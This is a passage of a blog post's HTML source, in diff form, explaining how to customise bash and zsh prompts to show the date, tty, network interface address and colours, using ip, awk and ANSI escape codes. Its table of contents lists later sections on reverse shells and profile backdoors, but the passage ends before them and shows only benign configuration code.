+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2023/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2023
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2022/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2022
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2019/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2019
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../../../" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2024-05-29 00:00:00+00:00" class="md-ellipsis">May 29, 2024</time>
+                      </div>
+                    </li>
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 13h1.5v2.82l2.44 1.41-.75 1.3L15 16.69zm4-5H5v11h4.67c-.43-.91-.67-1.93-.67-3a7 7 0 0 1 7-7c1.07 0 2.09.24 3 .67zM5 21a2 2 0 0 1-2-2V5c0-1.11.89-2 2-2h1V1h2v2h8V1h2v2h1a2 2 0 0 1 2 2v6.1c1.24 1.26 2 2.99 2 4.9a7 7 0 0 1-7 7c-1.91 0-3.64-.76-4.9-2zm11-9.85A4.85 4.85 0 0 0 11.15 16c0 2.68 2.17 4.85 4.85 4.85A4.85 4.85 0 0 0 20.85 16c0-2.68-2.17-4.85-4.85-4.85"/></svg>
+                          <time datetime="2025-09-14 00:00:00+00:00" class="md-ellipsis">September 14, 2025</time>
+                        </div>
+                      </li>
+                    
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              18 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+            
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prompt-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Prompt String
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prompt String">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#network-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ansi-colors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ANSI Colors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        bash
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zsh-kali" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        zsh (Kali)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#controlling-venv" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Controlling (venv)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#making-the-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Making the Changes
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#testing-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Testing Changes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#aliases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Aliases
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#export-and-import-shell-profiles-gnome" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Export and Import Shell Profiles (GNOME)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bashrc-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        bashrc Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="bashrc Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reverse Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#profile-backdoor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Profile Backdoor
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detecting-modification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detecting Modification
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+  
+  
+
+
+<h1 id="custom-shell-profiles"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M0 2.75C0 1.784.784 1 1.75 1h12.5c.966 0 1.75.784 1.75 1.75v10.5A1.75 1.75 0 0 1 14.25 15H1.75A1.75 1.75 0 0 1 0 13.25Zm1.75-.25a.25.25 0 0 0-.25.25v10.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V2.75a.25.25 0 0 0-.25-.25ZM7.25 8a.75.75 0 0 1-.22.53l-2.25 2.25a.749.749 0 0 1-1.275-.326.75.75 0 0 1 .215-.734L5.44 8 3.72 6.28a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l2.25 2.25c.141.14.22.331.22.53m1.5 1.5h3a.75.75 0 0 1 0 1.5h-3a.75.75 0 0 1 0-1.5"/></svg></span> Custom Shell Profiles</h1>
+<p>Working with and customizing shell profiles.</p>
+<!-- more -->
+
+<div class="admonition abstract">
+<p class="admonition-title">How did this start?</p>
+<p>The examples below are essentially replicating what's displayed in the <a href="https://www.trustedsec.com/blog/workflow-improvements-for-pentesters/">TrustedSec blog post</a>, in a way that looks like the Kali <code>zsh</code>. The <a href="https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808">gist by Carlos Polop</a> has examples for more advanced things you can do such as displaying current CPU, RAM and disk usage in the prompt.</p>
+</div>
+<p><em>This file is originally from <a href="https://github.com/straysheep-dev/linux-configs/tree/main/shells">straysheep-dev/linux-configs</a>.</em></p>
+<h2 id="references">References</h2>
+<p>This post draws heavily from the following references:</p>
+<ul>
+<li><a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables-1">GNU Bash Manual: Shell Variables</a></li>
+<li><a href="https://www.gnu.org/software/bash/manual/bash.html#Controlling-the-Prompt-1">GNU Bash Manual: Controlling the Prompt String</a></li>
+<li><a href="https://www.kali.org/blog/kali-linux-2022-1-release/#shell-prompt-changes">Kali Linux Blog: Shell Prompt Change</a></li>
+<li><a href="https://www.trustedsec.com/blog/workflow-improvements-for-pentesters/">TrustedSec: Shell Improvements for Pentesters</a></li>
+<li><a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">ohmyzsh: Themes</a></li>
+<li><a href="https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808">github.com/carlospolop: Shell Prompt Gist</a></li>
+<li><a href="https://stackoverflow.com/questions/61335641/bash-or-z-shell-terminal-prompt-with-time-and-date">Stack Overflow: Shell Prompt with Datetime</a></li>
+<li><a href="https://superuser.com/questions/668174/how-can-you-display-host-ip-address-in-bash-prompt">Super User: Display IP in Shell Prompt</a></li>
+<li><a href="https://unix.stackexchange.com/questions/145672/print-last-element-of-each-row">Stack Exchange: Print Last Element of Each Row</a></li>
+<li><a href="https://wiki.archlinux.org/title/GNOME#Configuration">Arch Linux Wiki: GNOME Configuration</a></li>
+<li><a href="https://wiki.archlinux.org/title/Bash/Prompt_customization#Embedding_commands">Arch Linux Wiki: Prompt Customization</a></li>
+<li><a href="https://askubuntu.com/questions/967517/how-to-backup-gnome-terminal-emulator-settings">Ask Ubuntu: Backup GNOME Terminal Settings</a></li>
+<li><a href="https://unix.stackexchange.com/questions/611419/how-does-the-escape-character-work-in-bash-prompt">Stack Exchange: How the Escape <code>\</code> Character Works in Bash</a></li>
+<li><a href="https://stackoverflow.com/questions/10406926/how-do-i-change-the-default-virtualenv-prompt">Stack Overflow: How Do I Change the <code>virtualenv</code> Prompt?</a></li>
+</ul>
+<p>Additional resources that are useful here:</p>
+<ul>
+<li><a href="https://academy.tcm-sec.com/p/linux-101">TCM-SEC Academy: Linux 101</a></li>
+<li><a href="https://www.antisyphontraining.com/regular-expressions-your-new-lifestyle-w-joff-thyer/">Antisyphon Training: Regular Expressions with Joff Thyer</a></li>
+</ul>
+<hr />
+<h2 id="prompt-string">Prompt String</h2>
+<p><em>Use your shell prompt to track your user, hostname, tty, the date/time, interface information, and working directory.</em></p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">[</span><span class="n">user</span><span class="nd">@fedora</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="mi">2024</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">13</span><span class="err">•</span><span class="mi">15</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">11</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="n">eth0</span><span class="p">:</span><span class="mf">10.55.55.28</span><span class="o">/</span><span class="mi">24</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">tmp</span><span class="p">]</span>
+<span class="err">└─$</span>
+</code></pre></div>
+<p>The following sections detail how to do this with your shell prompt.</p>
+<div class="admonition tip">
+<p class="admonition-title">Bash Documentation</p>
+<p>There are a number of built-in escape characters and modifiers for <code>bash</code> that you can start with. Be sure to check those first. These are also discussed below in the <a href="#bash">bash</a> section.</p>
+<ul>
+<li><a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables-1">GNU Bash Manual: Shell Variables</a></li>
+<li><a href="https://www.gnu.org/software/bash/manual/bash.html#Controlling-the-Prompt-1">GNU Bash Manual: Controlling the Prompt String</a></li>
+</ul>
+</div>
+<h3 id="network-information">Network Information</h3>
+<p>Using <code>ip</code> and <code>awk</code> in functions, networking interface information can be obtained dynamically per system.</p>
+<ul>
+<li><a href="https://www.gnu.org/software/gawk/manual/html_node/Comparison-Operators.html">GNU awk: Comparison Operators</a></li>
+<li><a href="https://www.gnu.org/software/gawk/manual/html_node/Exit-Statement.html">GNU awk: Exit Statement</a></li>
+<li><a href="https://www.gnu.org/software/gawk/manual/html_node/Using-BEGIN_002fEND.html">GNU awk: Using BEGIN and END</a></li>
+<li><a href="https://www.gnu.org/software/gawk/manual/html_node/Reference-to-Elements.html">GNU awk: Referencing Elements</a></li>
+<li><a href="https://www.ibm.com/docs/en/aix/7.2?topic=awk-command#awk__a171c125b">IBM: awk BEGIN and END Patterns</a></li>
+<li><a href="https://unix.stackexchange.com/questions/182400/print-ip-address-with-interface-name">StackExchange: Print IP Address with Interface</a></li>
+<li><a href="https://stackoverflow.com/questions/66526798/print-all-elements-in-an-array-in-awk">StackExchange: Print all Elements of an Array in awk</a></li>
+<li><a href="https://stackoverflow.com/questions/54785845/printing-array-contents-in-the-same-line-in-awk">StackExchange: Print Array Contents on Same Line with awk</a></li>
+</ul>
+<p>You'll need <code>awk</code> to consider the entire input when processing data. Nested "if" statements in <code>awk</code> do not work as expected because data is processed line by line. Printing the input that <code>awk</code> is being fed with <code>print $0</code> will illustrate what <code>awk</code> is seeing and in what order. Basically each line is processed against an entire block of conditionals. This is different than how bash processes input, where the entire input could be considered a single string, where it's all processed at once.</p>
+<p>For example: Even if a higher priority match for an if statement exists in the input, unless it appears on an earlier line than a lower priority match, it will never be matched.</p>
+<div class="highlight"><pre><span></span><code>ip<span class="w"> </span>link<span class="w"> </span>show<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;: &#39;</span><span class="w"> </span><span class="s1">&#39;{</span>
+<span class="s1">    if ($2 ~ /tun|tap|wg[0-9]/) {</span>
+<span class="s1">        print $2</span>
+<span class="s1">        exit</span>
+<span class="s1">    } else if ($2 ~ /eth|en/) {</span>
+<span class="s1">        print $2</span>
+<span class="s1">        exit</span>
+<span class="s1">    }</span>
+<span class="s1">}&#39;</span>
+</code></pre></div>
+<ul>
+<li>Assume both <code>eth0</code> and <code>tun0</code> exist in the output of <code>ip link show</code>.</li>
+<li>This <code>awk</code> code will always print eth0 because it appears earlier than <code>tun0</code> in the output of <code>ip link show</code></li>
+<li>Unintuitively this means it will match on the second condition, because <code>tun0</code> hasn't been read yet</li>
+<li>So <code>tun0</code> will never be printed</li>
+<li><code>ip link show | sort -r | ...</code> will successfully print <code>tun0</code>, proving how <code>awk</code> processes data</li>
+</ul>
+<p><strong>Processing Data in awk with the END Pattern</strong></p>
+<p>The shortest way to do this appears to be creating an array of interfaces, and separating interfaces of the same prefix with a space. This gives us our list of interfaces, and the array assignment allows us to control priority, so we'll match first on <code>tunX/tapX</code>, then <code>wgX</code>, <code>enxX</code>, <code>ethX</code> and finally <code>wlan0</code> type interfaces.</p>
+<p><em>NOTE: Appending a final pipe to <code>| awk '{print $1}')</code> would ensure that in cases of multiple <code>ethX</code> interfaces, only the first is printed. This is otherwise handled by the commented out <code>#return</code> line in the <code>get_net_info()</code> function.</em></p>
+<div class="highlight"><pre><span></span><code><span class="nv">interface_list</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>link<span class="w"> </span>show<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;: &#39;</span><span class="w"> </span><span class="s1">&#39;{</span>
+<span class="s1">    if ($0 !~ /state DOWN/ &amp;&amp; $2 ~ /[a-z]+[0-9]/) {</span>
+<span class="s1">        interfaces[NR] = $2</span>
+<span class="s1">    }</span>
+<span class="s1">}</span>
+<span class="s1">END{</span>
+<span class="s1">    for(i in interfaces){</span>
+<span class="s1">        if (interfaces[i] ~ /^tun|^tap/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        } else if (interfaces[i] ~ /^wg[0-9]/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        } else if (interfaces[i] ~ /^en/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        } else if (interfaces[i] ~ /^eth/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        } else if (interfaces[i] ~ /^wl[a-z]+[0-9]$|^ath[0-9]/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        }</span>
+<span class="s1">    }</span>
+<span class="s1">}&#39;</span><span class="k">)</span>
+</code></pre></div>
+<p>Function to get the interface information:</p>
+<div class="highlight"><pre><span></span><code>get_net_info<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="c1"># Replace `$(echo $interface_list)` with a specific interface name or list of names if needed (e.g. `tun0 eth0`)</span>
+<span class="w">    </span><span class="c1">#for interface in eth0; do</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span>interface<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">$interface_list</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">        </span><span class="c1"># The `NR==1{&lt;SNIP&gt;; exit}` in awk at the end of the next line only prints the first IP, for interfaces with multipe IPs</span>
+<span class="w">        </span><span class="c1"># http://stackoverflow.com/questions/22190902/ddg#22190928</span>
+<span class="w">        </span><span class="nv">IFACE_NAME</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>dev<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$interface</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;inet\s.+</span><span class="nv">$interface</span>$<span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;NR==1{print $NF; exit}&#39;</span><span class="k">)</span>
+<span class="w">        </span><span class="nv">IFACE_ADDR</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>dev<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$interface</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;inet\s.+</span><span class="nv">$interface</span>$<span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;NR==1{print $2; exit}&#39;</span><span class="k">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">IFACE_NAME</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">IFACE_ADDR</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">            </span><span class="c1"># The &quot;${NC}:${YELLOW}&quot; is being passed to and interpretted by this script in your shell, it resets the color of the `:` symbol</span>
+<span class="w">            </span><span class="c1"># using the ANSI colors defined above.</span>
+<span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">IFACE_NAME</span><span class="si">}${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">YELLOW</span><span class="si">}${</span><span class="nv">IFACE_ADDR</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="w">            </span><span class="k">return</span>
+<span class="w">        </span><span class="k">fi</span>
+<span class="w">    </span><span class="k">done</span>
+<span class="o">}</span>
+</code></pre></div>
+<h3 id="ansi-colors">ANSI Colors</h3>
+<p>The prompt string itself is plain text here, with no color, but your terminal and all of its commands will still be in full color if color printing is supported. Adding color and additional formatting to the prompt string will require some form of using <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI escape codes</a>.</p>
+<p>The easiest way to demonstrate this is with the <a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/builder/linpeas_parts/linpeas_base.sh">linpeas color variables</a>, as they're clear to read instead of raw ANSI escape codes. The <code>SED_</code> variables are not necessary here, so they can be omitted.</p>
+<p>Write them at the top of your custom file like this:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+&lt;SNIP&gt;
+
+<span class="c1"># Colors and color printing code taken directly from:</span>
+<span class="c1"># https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/builder/linpeas_parts/linpeas_base.sh</span>
+<span class="nv">C</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\033&#39;</span><span class="k">)</span>
+<span class="nv">RED</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;31m&quot;</span>
+<span class="nv">GREEN</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;32m&quot;</span>
+<span class="nv">YELLOW</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;33m&quot;</span>
+<span class="nv">RED_YELLOW</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;31;103m&quot;</span>
+<span class="nv">BLUE</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;34m&quot;</span>
+<span class="nv">ITALIC_BLUE</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;34m</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[3m&quot;</span>
+<span class="nv">LIGHT_MAGENTA</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;95m&quot;</span>
+<span class="nv">LIGHT_CYAN</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;96m&quot;</span>
+<span class="nv">LG</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;37m&quot;</span><span class="w"> </span><span class="c1">#LightGray</span>
+<span class="nv">DG</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;90m&quot;</span><span class="w"> </span><span class="c1">#DarkGray</span>
+<span class="nv">NC</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[0m&quot;</span>
+<span class="nv">UNDERLINED</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[5m&quot;</span>
+<span class="nv">ITALIC</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[3m&quot;</span>
+
+&lt;SNIP&gt;
+</code></pre></div>
+<p>To change a section to be green, write <code>${GREEN}</code> ahead of the text you wish to change, and <code>${NC}</code> (meaning no color) directly behind the text.</p>
+<ul>
+<li><code>${GREEN}</code> changes all subsequent text to green</li>
+<li><code>${NC}</code> returns all subsequent text back to plain text</li>
+</ul>
+<p>In this example the date string, and time string, will be green, but the dot <code>•</code> that separates them will not.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Example snippet</span>
+&lt;SNIP&gt;-<span class="o">(</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="se">\D</span><span class="o">{</span>%Y-%m-%d<span class="o">}</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span>•<span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="se">\t</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="o">)</span>-&lt;SNIP&gt;
+</code></pre></div>
+<h3 id="bash">bash</h3>
+<p><code>bash</code> is universally available on Linux. Certain escape sequences have unique behavior in bash prompts. These escape characters work the same in bash across different platforms, especially when using a custom shell profile to override any unique changes the OS makes to the shell prompt.</p>
+<div class="admonition tip">
+<p class="admonition-title">Prompt Customization Guides</p>
+<ul>
+<li><a href="https://www.gnu.org/software/bash/manual/bash.html#Controlling-the-Prompt-1">GNU Bash Manual: Controlling the Prompt String</a></li>
+<li><a href="https://wiki.archlinux.org/title/Bash/Prompt_customization#Embedding_commands">Arch Linux Wiki: Prompt Customization</a></li>
+<li><a href="https://unix.stackexchange.com/questions/611419/how-does-the-escape-character-work-in-bash-prompt">Stack Exchange: How the Escape <code>\</code> Character Works in Bash</a></li>
+</ul>
+</div>
+<div class="highlight"><pre><span></span><code># Example Ubuntu `bash` prompt:
+┌──[ubuntu@ubuntu2204:2]-(2024-05-13•22:26:15)-(eth0:172.16.1.14/24)-[/tmp]
+└─$
+</code></pre></div>
+<ul>
+<li><code>\D{%Y-%m-%d}</code>: Displays the date based on the format within curly brackets</li>
+<li><code>\t</code>: Displays the time as <code>hh:mm:ss</code></li>
+<li><code>\l</code>: Shows your current TTY</li>
+<li><code>\$(&lt;cmd&gt;)</code>: Will cause any command or function to execute each time the <code>PS1</code> string is printed</li>
+</ul>
+<div class="admonition note">
+<p class="admonition-title">Escaping commands with <code>\$(&lt;cmd&gt;)</code></p>
+<p>If you don't <a href="https://wiki.archlinux.org/title/Bash/Prompt_customization#Embedding_commands">escape embedded commands</a>, any command substituation done in your shell will only excute <strong><em>once</em></strong>, when the shell loads, instead of (what you likely are intending) which is to update the prompt string every time you press enter.</p>
+</div>
+<p><strong>Modify .bashrc (difficult)</strong></p>
+<p>If you'd like to try to insert this into your existing <code>PS1</code> variable:</p>
+<ul>
+<li>You'll need to figure out how this fits into your current <code>PS1</code> string</li>
+<li>Don't forget to also insert the <code>get_net_info()</code> function somewhere above the <code>PS1</code> variable</li>
+<li>Harder to maintain</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1"># Just date/time, net info</span>
+&lt;SNIP&gt;:<span class="se">\l</span><span class="o">]</span>-<span class="o">(</span><span class="se">\D</span><span class="o">{</span>%Y-%m-%d<span class="o">}</span>•<span class="se">\t</span><span class="o">)</span>-<span class="o">(</span><span class="se">\$</span><span class="o">(</span>get_net_info<span class="o">))</span>-&lt;SNIP&gt;
+</code></pre></div>
+<p><strong>Custom Dotfile (recommended)</strong></p>
+<p>Or to replace your <code>PS1</code> variable in a separate dot file (e.g. <code>~/.custom_shell.sh</code>):</p>
+<ul>
+<li>You'll lose any special changes or settings your default <code>.bashrc</code> prompt string provides</li>
+<li>Add a line at the end of your <code>.bashrc</code> to source this file and use it</li>
+<li>Easier to maintain</li>
+</ul>
+<div class="highlight"><pre><span></span><code>&lt;SNIP&gt;
+<span class="w">    </span><span class="c1"># Entire variable</span>
+<span class="w">    </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;┌──[\u@\h:\l]-(\D{%Y-%m-%d}•\t)-(\$(get_net_info))-[\w]\n└─\\</span>$<span class="s2"> &quot;</span>
+&lt;SNIP&gt;
+</code></pre></div>
+<p><a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables-1">Shell variables</a> exist in bash that can be used to customize these settings further. One of the most useful variables is <code>PROMPT_DIRTRIM</code>.</p>
+<div class="admonition tip">
+<p class="admonition-title"><code>PROMPT_DIRTRIM</code></p>
+<p>If set to a number greater than zero, the value is used as the number of trailing directory components to retain when expanding the \w and \W prompt string escapes (see Controlling the Prompt). Characters removed are replaced with an ellipsis.</p>
+<p>Example: <code>export PROMPT_DIRTRIM=2</code></p>
+</div>
+<h3 id="zsh-kali">zsh (Kali)</h3>
+<p>Both <code>zsh</code> and <code>bash</code> are customized in Kali, making editing them a different process.</p>
+<p><em>For <code>zsh</code> customization, you may want to look at <a href="https://github.com/ohmyzsh/ohmyzsh">ohmyzsh</a>, which is an entire framework for managing your <code>zsh</code> configuration.</em></p>
+<p>For basic modifications, you can run <code>kali-tweaks</code> from any shell, which is a menu to customize the system. <code>Shell &amp; Prompt</code> are one of the options, these allow you to enable preset cusomizations to the shell prompt.</p>
+<p>Example Kali <code>zsh</code> prompt:</p>
